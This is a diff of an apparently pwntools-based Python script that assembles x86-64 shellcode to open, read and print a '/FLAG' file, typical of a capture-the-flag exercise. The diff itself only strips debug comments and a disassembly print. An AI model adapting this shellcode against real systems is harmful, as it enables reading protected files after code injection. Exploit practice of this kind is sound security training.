@@ -205,19 +205,6 @@ def get_asm_put_onto_codeint():
         asm("""mov rax, 0x0047414c462f
         mov qword ptr [rdi], rax
         """),
-        # mov r14, rdi
-
-        # write to see if the /FLAG is correctly 
-        # rax: write syscall number 1
-        # rdi: fd, stdout 1
-        # rsi: write the content from what address
-        # rdx: count, write 20 byte to stdout and end at null terminator
-        # asm("""mov rax, 1
-        # mov rdi, 1
-        # mov rsi, r14
-        # mov rdx, 20
-        # syscall
-        # """),
 
         # open /FLAG file with O_RDONLY flag
         # rax: open syscall number 2
@@ -228,7 +215,6 @@ def get_asm_put_onto_codeint():
         mov rsi, 0
         syscall
         """),
-        # mov rdi, r14
 
         # save file descriptor return from open (in rax) to r9
         asm("""mov r9, rax"""),
@@ -245,7 +231,7 @@ def get_asm_put_onto_codeint():
         syscall
         """),
 
-        # write the read content to stdout
+        # write the read content(flag) to stdout
         # rax: write syscall number 1
         # rdi: fd, stdout 1
         # rsi: write the content from what address
@@ -270,8 +256,8 @@ def get_asm_put_onto_codeint():
         syscall""")
     )
 
-    disassembly = disasm(send_line) # Disassemble shellcode
-    print("disassembly:\n", disassembly)
+    # disassembly = disasm(send_line) # Disassemble shellcode
+    # print("disassembly:\n", disassembly)
 
     return send_line
 
